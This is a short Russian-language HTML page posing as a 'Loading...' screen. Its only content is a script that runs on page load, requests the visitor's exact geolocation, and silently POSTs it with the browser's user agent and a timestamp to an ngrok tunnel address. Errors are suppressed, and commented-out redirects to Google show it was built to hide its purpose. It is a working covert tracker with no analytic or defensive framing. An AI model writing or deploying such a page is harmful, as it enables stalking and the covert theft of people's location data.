<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Загрузка...</title>
</head>
<body style="margin:0; padding:0; background:#fff;">

<script>
  (async () => {
    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject('Геолокация не поддерживается');
        } else {
          navigator.geolocation.getCurrentPosition(
            pos => resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }),
            err => reject('Ошибка геолокации: ' + err.message)
          );
        }
      });
    }

    try {
      const ua = navigator.userAgent;
      const geo = await getLocation();

      const data = {
        userAgent: ua,
        geolocation: geo,
        timestamp: new Date().toISOString()
      };

      await fetch('https://5b74-169-150-218-29.ngrok-free.app/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'ngrok-skip-browser-warning': 'true'
        },
        body: JSON.stringify(data)
      });

      // Здесь убрал редирект
      // window.location.href = "https://www.google.com";

    } catch(e) {
      // Ошибки просто игнорируем
      // window.location.href = "https://www.google.com"; // тоже убираем редирект
    }
  })();
</script>

</body>
</html>
